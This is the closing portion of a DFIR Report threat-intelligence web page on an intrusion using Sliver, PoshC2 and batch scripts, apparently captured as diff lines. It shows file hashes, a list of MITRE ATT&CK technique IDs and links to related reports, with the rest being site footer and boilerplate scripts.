+fe00973fc12b3c6330abd9807dfb1d70
+d2f5c890e3e1dd9b42e695586c06408b31d4ec7a
+38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955
+</pre>
+
+
+
+<h2 class="wp-block-heading">MITRE</h2>
+
+
+
+<pre class="wp-block-preformatted">Accessibility Features - T1546.008
+Account Access Removal - T1531
+Application Layer Protocol - T1071
+Asymmetric Cryptography - T1573.002
+Clear Windows Event Logs - T1070.001
+Deobfuscate/Decode Files or Information - T1140
+Disable or Modify Tools - T1562.001
+Disable Windows Event Logging - T1562.002
+Encrypted Channel - T1573
+Inhibit System Recovery - T1490
+Modify Registry - T1112
+PowerShell - T1059.001
+Proxy - T1090
+Python - T1059.006
+Registry Run Keys / Startup Folder - T1547.001
+Remote Access Software - T1219
+Service Stop - T1489
+System Owner/User Discovery - T1033
+Web Protocols - T1071.001
+Windows Command Shell - T1059.003
+</pre>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/09/26297_070_1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37243" src="https://thedfirreport.com/wp-content/uploads/2025/09/26297_070_1.png" alt="" width="2056" height="2682" /></a></p>
+<p>Internal case #AI26297 PR31059</p>
+
+
+						
+						<div class="av-share-box"><h5 class='av-share-link-description av-no-toc '>Share this entry</h5><ul class="av-share-box-list noLightbox"><li class='av-share-link av-social-link-facebook' ><a target="_blank" aria-label="Share on Facebook" href="https://www.facebook.com/sharer.php?u=https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/&amp;t=Threat%20Actors%27%20Toolkit%3A%20Leveraging%20Sliver%2C%20PoshC2%20%26%20Batch%20Scripts" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="" data-avia-related-tooltip="Share on Facebook" rel="noopener"><span class='avia_hidden_link_text'>Share on Facebook</span></a></li><li class='av-share-link av-social-link-x' ><a target="_blank" aria-label="Share on X" href="https://x.com/share?text=Threat%20Actors%27%20Toolkit%3A%20Leveraging%20Sliver%2C%20PoshC2%20%26%20Batch%20Scripts&amp;url=https://thedfirreport.com/?p=37127" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="" data-avia-related-tooltip="Share on X" rel="noopener"><span class='avia_hidden_link_text'>Share on X</span></a></li><li class='av-share-link av-social-link-whatsapp' ><a target="_blank" aria-label="Share on WhatsApp" href="https://api.whatsapp.com/send?text=https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/" aria-hidden="false" data-av_icon="" data-av_iconfont="entypo-fontello" title="" data-avia-related-tooltip="Share on WhatsApp" rel="noopener"><span class='avia_hidden_link_text'>Share on WhatsApp</span></a></li><li class='av-share-link av-social-link-linkedin' ><a target="_blank" aria-label="Share on Linkedin" href="https://linkedin.com/shareArticle?mini=true&amp;title=Threat%20Actors%27%20Toolkit%3A%20Leveraging%20Sliver%2C%20PoshC2%20%26%20Batch%20Scripts&amp;url=https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="" data-avia-related-tooltip="Share on Linkedin" rel="noopener"><span class='avia_hidden_link_text'>Share on Linkedin</span></a></li><li class='av-share-link av-social-link-reddit' ><a target="_blank" aria-label="Share on Reddit" href="https://reddit.com/submit?url=https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/&amp;title=Threat%20Actors%27%20Toolkit%3A%20Leveraging%20Sliver%2C%20PoshC2%20%26%20Batch%20Scripts" aria-hidden="false" data-av_icon="" data-av_iconfont="entypo-fontello" title="" data-avia-related-tooltip="Share on Reddit" rel="noopener"><span class='avia_hidden_link_text'>Share on Reddit</span></a></li><li class='av-share-link av-social-link-mail' ><a aria-label="Share by Mail" href="/cdn-cgi/l/email-protection#87b8f4f2e5ede2e4f3bad3eff5e2e6f3a2b5b7c6e4f3e8f5f4a2b5b0a2b5b7d3e8e8ebeceef3a2b4c6a2b5b7cbe2f1e2f5e6e0eee9e0a2b5b7d4ebeef1e2f5a2b5c4a2b5b7d7e8f4efc4b5a2b5b7a2b5b1a2b5b7c5e6f3e4efa2b5b7d4e4f5eef7f3f4a1a4b7b4bfbce5e8e3febaeff3f3f7f4bda8a8f3efe2e3e1eef5f5e2f7e8f5f3a9e4e8eaa8b5b7b5b3a8b7bfa8b6b5a8f3eff5e2e6f3aae6e4f3e8f5f4aaf3e8e8ebeceef3aaebe2f1e2f5e6e0eee9e0aaf4ebeef1e2f5aaf7e8f4efe4b5aae5e6f3e4efaaf4e4f5eef7f3f4a8" aria-hidden='false' data-av_icon='' data-av_iconfont='fa-fontello' title='' data-avia-related-tooltip='Share by Mail'><span class='avia_hidden_link_text'>Share by Mail</span></a></li></ul></div>					</div>
+
+				</div><!-- .glossary-columns -->
+
+			</div><!-- .entry-content-wrapper -->
+		</div><!-- .content -->
+	</div><!-- .container -->
+</div><!-- .single-content-section -->
+
+	<div class="main_color related-posts-section section-before-footer">
+		<div class="container">
+			<div class="content">
+				<div class="ep-columns related-posts-header">
+					<div class="ep-columns-inner">
+						<div class="ep-column">
+							<div class="h3">
+								<div class="av-special-heading-tag">Related Reports</div>
+							</div>
+						</div>
+						<div class="ep-column">
+							<a href="https://thedfirreport.com/reports/" class="avia-button avia-icon_select-no avia-style-default avia-color-link avia-size-large avia-position-left">
+								<span class="avia_iconbox_title">View all</span>
+							</a>
+
+						</div>
+					</div>
+				</div>
+			<div  class='ep-posts-grid-container ep-grid-wrapper ep-space-small  '  ><div class='ep-posts-grid ep-grid  facetwp-template ep-grid-columns  is-variable  '><div class="ep-item ep-posts-grid-item  ep-post-grid-item ep-grid-column one-full-mobile one-half-tablet one-third  entry entry-50310 entry-post   ep-item-has-button " >
+    <div class="ep-item-inner   ">
+        
+            <div class="header-post-wrapper"> 
+                                <div class="post-tags">
+                    <div class='ep-post-tags'><a class='ep-item-term ep-item-term-akira' href='https://thedfirreport.com/category/ransomware/akira/' >akira</a> <a class='ep-item-term ep-item-term-ransomware' href='https://thedfirreport.com/category/ransomware/' >ransomware</a></div>
+                </div>
+                               
+            </div>
+      
+                        <div class="ep-item-media">
+                <div class="ep-item-image">
+                    <a class='noHover' href='https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/' >                        <img width="1271" height="508" src="https://thedfirreport.com/wp-content/uploads/pr_36726_001.png" class="avia-img-lazy-loading-50388 attachment-post-thumbnail size-post-thumbnail" alt="" loading="lazy" decoding="async" />                    </a>                </div>
+            </div>
+            
+            <div class="ep-item-contents">
+            
+                                <div class="ep-post-terms">
+                    <a class='ep-item-term ep-item-term-akira' href='https://thedfirreport.com/category/ransomware/akira/' >akira</a>, <a class='ep-item-term ep-item-term-ransomware' href='https://thedfirreport.com/category/ransomware/' >ransomware</a>                </div>
+                             
+            
+                                    <div class="ep-item-title-wrapper ">        
+                        <h6 class="ep-item-title av-special-heading-tag" >
+                            <a class='noHover' href='https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/' >                                From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira                            </a>                        </h6>        
+                    </div>
+                         
+
+                          
+            
+            </div>  
+            
+            <div class="footer-post-wrapper">  
+                                    <div class="ep-item-button-wrapper">                    
+                        <a href="https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/"  class="avia-button avia-style-go avia-color-theme-color avia-size-large">
+                            <span class="avia_iconbox_title">Read more</span>
+                        </a>                    
+                    </div>
+                
+                                <div class="ep-post-date">
+                    	<div class="ep-post-meta">
+				June 29, 2026			</div>
+	                </div>
+                            </div>
+
+            </div>
+</div>
+
+<div class="ep-item ep-posts-grid-item  ep-post-grid-item ep-grid-column one-full-mobile one-half-tablet one-third  entry entry-50191 entry-post   ep-item-has-button " >
+    <div class="ep-item-inner   ">
+        
+            <div class="header-post-wrapper"> 
+                                <div class="post-tags">
+                    <div class='ep-post-tags'><a class='ep-item-term ep-item-term-thegentlemen' href='https://thedfirreport.com/category/ransomware/thegentlemen/' >thegentlemen</a> <a class='ep-item-term ep-item-term-flash-alert' href='https://thedfirreport.com/category/flash-alert/' >Flash Alert</a> <a class='ep-item-term ep-item-term-ransomware' href='https://thedfirreport.com/category/ransomware/' >ransomware</a></div>
+                </div>
+                               
+            </div>
+      
+                        <div class="ep-item-media">
+                <div class="ep-item-image">
+                    <a class='noHover' href='https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/' >                        <img width="1702" height="971" src="https://thedfirreport.com/wp-content/uploads/fa-40048-001-1.png" class="avia-img-lazy-loading-50205 attachment-post-thumbnail size-post-thumbnail" alt="" loading="lazy" decoding="async" />                    </a>                </div>
+            </div>
+            
+            <div class="ep-item-contents">
+            
+                                <div class="ep-post-terms">
+                    <a class='ep-item-term ep-item-term-thegentlemen' href='https://thedfirreport.com/category/ransomware/thegentlemen/' >thegentlemen</a>, <a class='ep-item-term ep-item-term-flash-alert' href='https://thedfirreport.com/category/flash-alert/' >Flash Alert</a>, <a class='ep-item-term ep-item-term-ransomware' href='https://thedfirreport.com/category/ransomware/' >ransomware</a>                </div>
+                             
+            
+                                    <div class="ep-item-title-wrapper ">        
+                        <h6 class="ep-item-title av-special-heading-tag" >
+                            <a class='noHover' href='https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/' >                                Flash Alert: EtherRat and TukTuk C2 End in The Gentleman Ransomware                            </a>                        </h6>        
+                    </div>
+                         
+
+                          
+            
+            </div>  
+            
+            <div class="footer-post-wrapper">  
+                                    <div class="ep-item-button-wrapper">                    
+                        <a href="https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/"  class="avia-button avia-style-go avia-color-theme-color avia-size-large">
+                            <span class="avia_iconbox_title">Read more</span>
+                        </a>                    
+                    </div>
+                
+                                <div class="ep-post-date">
+                    	<div class="ep-post-meta">
+				May 11, 2026			</div>
+	                </div>
+                            </div>
+
+            </div>
+</div>
+
+<div class="ep-item ep-posts-grid-item  ep-post-grid-item ep-grid-column one-full-mobile one-half-tablet one-third  entry entry-50133 entry-post   ep-item-has-button " >
+    <div class="ep-item-inner   ">
+        
+            <div class="header-post-wrapper"> 
+                                <div class="post-tags">
+                    <div class='ep-post-tags'><a class='ep-item-term ep-item-term-opendir' href='https://thedfirreport.com/category/opendir/' >opendir</a></div>
+                </div>
+                               
+            </div>
+      
+                        <div class="ep-item-media">
+                <div class="ep-item-image">
+                    <a class='noHover' href='https://thedfirreport.com/2026/04/22/bissa-scanner-exposed-ai-assisted-mass-exploitation-and-credential-harvesting/' >                        <img width="1309" height="873" src="https://thedfirreport.com/wp-content/uploads/40002-006_1.png" class="avia-img-lazy-loading-50153 attachment-post-thumbnail size-post-thumbnail" alt="" loading="lazy" decoding="async" />                    </a>                </div>
+            </div>
+            
+            <div class="ep-item-contents">
+            
+                                <div class="ep-post-terms">
+                    <a class='ep-item-term ep-item-term-opendir' href='https://thedfirreport.com/category/opendir/' >opendir</a>                </div>
+                             
+            
+                                    <div class="ep-item-title-wrapper ">        
+                        <h6 class="ep-item-title av-special-heading-tag" >
+                            <a class='noHover' href='https://thedfirreport.com/2026/04/22/bissa-scanner-exposed-ai-assisted-mass-exploitation-and-credential-harvesting/' >                                Bissa Scanner Exposed: AI-Assisted Mass Exploitation and Credential Harvesting                            </a>                        </h6>        
+                    </div>
+                         
+
+                          
+            
+            </div>  
+            
+            <div class="footer-post-wrapper">  
+                                    <div class="ep-item-button-wrapper">                    
+                        <a href="https://thedfirreport.com/2026/04/22/bissa-scanner-exposed-ai-assisted-mass-exploitation-and-credential-harvesting/"  class="avia-button avia-style-go avia-color-theme-color avia-size-large">
+                            <span class="avia_iconbox_title">Read more</span>
+                        </a>                    
+                    </div>
+                
+                                <div class="ep-post-date">
+                    	<div class="ep-post-meta">
+				April 22, 2026			</div>
+	                </div>
+                            </div>
+
+            </div>
+</div>
+
+</div></div>			</div>
+		</div>
+	</div>
+
+<div class="footer-page-content footer_color" id="footer-page"><div id='av_section_1'  class='avia-section main_color avia-section-default avia-no-border-styling  avia-bg-style-scroll  avia-builder-el-0  avia-builder-el-first  footer-section footer-section   container_wrap fullsize' style='  '   data-lazy-css='https://thedfirreport.com/wp-content/themes/dfir/assets/css/footer.css?1.1.81'><div class='container' ><main  class='template-page content  av-content-full alpha units' ><div class='post-entry post-entry-type-page post-entry-37127'><div class='entry-content-wrapper clearfix'>
+<div   class='ep-columns ep-space-small avia-full-stretch align-top   ep-break-at-tablet ep-columns-1 '   ><div class='ep-columns-inner'><div  class="ep-column one-half   first  avia-builder-el-1  avia-builder-el-first   " ><div class="ep-column-inner" ><div><div  class='avia-image-container ep-flex  ep-space-small     avia-builder-el-2  avia-builder-el-no-sibling   ep-align-'  ><div class='avia-image-container-inner' ><div class='avia-image-overlay-wrap'><img decoding="async" loading='lazy' class='wp-image-865 avia-img-lazy-loading-865 avia_image' src="https://thedfirreport.com/wp-content/uploads/DFIR-Featured-Image@2x.png" alt='' title='DFIR-Featured-Image@2x' height="675" width="1200"  /></div></div></div></div></div></div><div  class="ep-column one-half     avia-builder-el-3   " ><div class="ep-column-inner" ><div><div  class='avia-buttonrow-wrap avia-buttonrow-right ep-space-small     avia-builder-el-4  avia-builder-el-no-sibling  ' >
+<a href='https://dfirlabs.thedfirreport.com/auth/login'  class='avia-button  avia-icon_select-no avia-style-main avia-color-red avia-size-medium'  target="_blank"  style='margin-bottom:5px; margin-left:5px; ' ><span class='avia_iconbox_title' >Access DFIR Labs</span></a>
+<a href='https://thedfirreport.com/company/contact-us/'  class='avia-button  avia-icon_select-no avia-style-main avia-color-gray avia-size-medium'  style='margin-bottom:5px; margin-left:5px; ' ><span class='avia_iconbox_title' >Book a Demo</span></a>
+</div></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 --><div   class='ep-columns ep-space-small avia-full-stretch align-top   ep-break-at-tablet ep-columns-2 '   ><div class='ep-columns-inner'><div  class="ep-column two-fifths   first  avia-builder-el-5   column-top-margin" ><div class="ep-column-inner" ><div><div class="avia_textblock ep-text   avia-builder-el-6  avia-builder-el-first   ep-space-small     "   style='--epMaxWidthDesktop:348px; --epMaxWidthMobile:100%; '><p>The DFIR Report provides in-depth, real-world intelligence based on observed intrusions, enabling security analysts and teams  to strengthen defenses, enhance detection,  and accelerate response.</p>
+</div>
+			<div  class='ep-social-bookmarks-wrapper   avia-builder-el-7  avia-builder-el-last  '>
+				<ul class='noLightbox ep-social-bookmarks ep-align-left icon_count_2'><li class='ep-social-bookmarks ep-align-left_linkedin av-social-link-linkedin social_icon_1'><a target="_blank" aria-label="Link to Linkedin" href="https://www.linkedin.com/company/the-dfir-report" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="Linkedin" rel="noopener"><span class='avia_hidden_link_text'>Linkedin</span></a></li><li class='ep-social-bookmarks ep-align-left_x av-social-link-x social_icon_2'><a target="_blank" aria-label="Link to X" href="https://x.com/TheDFIRReport" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="X" rel="noopener"><span class='avia_hidden_link_text'>X</span></a></li></ul>			</div></div></div></div><div  class="ep-column one-fifth     avia-builder-el-8   column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-horizontal   avia-builder-el-9  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-menu-1" class="menu" role="menu"><li role="menuitem" id="menu-item-964" class="menu-title menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://thedfirreport.com/products/" tabindex="0"><span class="avia-menu-text">Products</span></a>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-970" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/" tabindex="0"><span class="avia-menu-text">Threat Intel</span></a></li>
+	<li role="menuitem" id="menu-item-968" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/dfir-labs/" tabindex="0"><span class="avia-menu-text">DFIR Labs</span></a></li>
+	<li role="menuitem" id="menu-item-966" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/case-artifacts/" tabindex="0"><span class="avia-menu-text">Case Artifacts</span></a></li>
+	<li role="menuitem" id="menu-item-49372" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-feed/" tabindex="0"><span class="avia-menu-text">Threat Feed</span></a></li>
+	<li role="menuitem" id="menu-item-967" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/detection-pack/" tabindex="0"><span class="avia-menu-text">Detection Pack</span></a></li>
+	<li role="menuitem" id="menu-item-965" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/active-defense/" tabindex="0"><span class="avia-menu-text">Active Defense</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div><div  class="ep-column one-fifth     avia-builder-el-10   column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-horizontal   avia-builder-el-11  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-menu-2" class="menu" role="menu"><li role="menuitem" id="menu-item-974" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://thedfirreport.com/services/" tabindex="0"><span class="avia-menu-text">Services</span></a>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-976" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/training/" tabindex="0"><span class="avia-menu-text">Training</span></a></li>
+	<li role="menuitem" id="menu-item-975" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/" tabindex="0"><span class="avia-menu-text">Professional Services</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-973" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-2"><a class="menu-item-inner" href="https://thedfirreport.com/reports/" tabindex="0"><span class="avia-menu-text">Public Reports</span></a></li>
+</ul>				</div></div></div></div><div  class="ep-column one-fifth     avia-builder-el-12  avia-builder-el-last   column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-horizontal   avia-builder-el-13  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-menu-3" class="menu" role="menu"><li role="menuitem" id="menu-item-977" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://thedfirreport.com/company/" tabindex="0"><span class="avia-menu-text">Company</span></a>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-978" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/about-us/" tabindex="0"><span class="avia-menu-text">About us</span></a></li>
+	<li role="menuitem" id="menu-item-979" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/analysts/" tabindex="0"><span class="avia-menu-text">Analysts</span></a></li>
+	<li role="menuitem" id="menu-item-980" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/careers/" tabindex="0"><span class="avia-menu-text">Careers</span></a></li>
+	<li role="menuitem" id="menu-item-981" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/contact-us/" tabindex="0"><span class="avia-menu-text">Contact Us</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 -->
+</p>
+<p></div></div></main><!-- close content main element --></div></div><div id='av_section_2'  class='avia-section main_color avia-section-default avia-no-border-styling  avia-bg-style-scroll  avia-builder-el-14  avia-builder-el-last  footer-socket-section   container_wrap fullsize' style='  '   data-lazy-css='https://thedfirreport.com/wp-content/themes/dfir/assets/css/footer.css?1.1.81'><div class='container' ><div class='template-page content  av-content-full alpha units' ><div class='post-entry post-entry-type-page post-entry-37127'><div class='entry-content-wrapper clearfix'>
+<div class="avia_textblock ep-text   avia-builder-el-15  avia-builder-el-no-sibling   ep-space-small     "  ><p style="text-align: center;">© 2025 The DFIR Report. All Rights Reserved. | <a href="https://thedfirreport.com/privacy-policy/">Privacy Policy</a></p>
+</div>
+</p>
+</div></div></div><!-- close content main div --> <!-- section close by builder template -->		</div><!--end builder template--></div><!-- close default .container_wrap element --></div>
+
+			<!-- end main -->
+		</div>
+
+		<!-- end wrap_all --></div>
+<div id="fb-root"></div>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/dfir/*","/wp-content/themes/punch/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+
+ <script type='text/javascript'>
+ /* <![CDATA[ */  
+var punch_globals = punch_globals || {};
+    punch_globals.siteUrl = 'https' + '://' + 'thedfirreport.com/';
+    punch_globals.frameworkUrl = 'https' + '://' + 'thedfirreport.com/wp-content/themes/punch/framework/';
+    punch_globals.installedAt = 'https' + '://' + 'thedfirreport.com/wp-content/themes/punch/';
+    punch_globals.ajaxurl = 'https' + '://' + 'thedfirreport.com/wp-admin/admin-ajax.php';
+/* ]]> */ 
+</script>
+ 
+ <script id="avia-module-enfold-fast-lazy-enabler-js" src="https://thedfirreport.com/wp-content/themes/punch/assets/js/dist/lazy-enabler.js?ver=1.0.94"></script>
+<script id="avia-module-enfold-fast-lazy-js" src="https://thedfirreport.com/wp-content/themes/punch/assets/js/enfold-fast-lazy.js?ver=1.0.94"></script>
+<script id="avia-module-enfold-fast-js" src="https://thedfirreport.com/wp-content/themes/punch/assets/js/enfold-fast.js?ver=1.0.94"></script>
+<script id="avia-module-main-js" src="https://thedfirreport.com/wp-content/themes/dfir/assets/js/main.js?ver=1.1.81"></script>
+<script id="jetpack-stats-js-before">
+_stq = window._stq || [];
+_stq.push([ "view", {"v":"ext","blog":"175340963","post":"37127","tz":"0","srv":"thedfirreport.com","j":"1:16.0.1"} ]);
+_stq.push([ "clickTrackerInit", "175340963", "37127" ]);
+//# sourceURL=jetpack-stats-js-before
+</script>
+<script data-wp-strategy="defer" defer fetchpriority="low" id="jetpack-stats-js" src="https://stats.wp.com/e-202631.js"></script>
+<script id="wp-emoji-settings" type="application/json">
+{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://thedfirreport.com/wp-includes/js/wp-emoji-release.min.js?ver=7.0.2"}}
+</script>
+<script type="module">
+/*! This file is auto-generated */
+const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
+//# sourceURL=https://thedfirreport.com/wp-includes/js/wp-emoji-loader.min.js
+</script>
+	<script>document.write('<link rel="stylesheet" href="https://thedfirreport.com/wp-content/themes/punch/assets/css/body.css?v=1.0.94">');</script>
+    	<script>document.write('<link rel="stylesheet" href="https://thedfirreport.com/wp-content/themes/dfir/assets/css/body.css?v=1.1.81">');</script>
+    </body>
+</html>
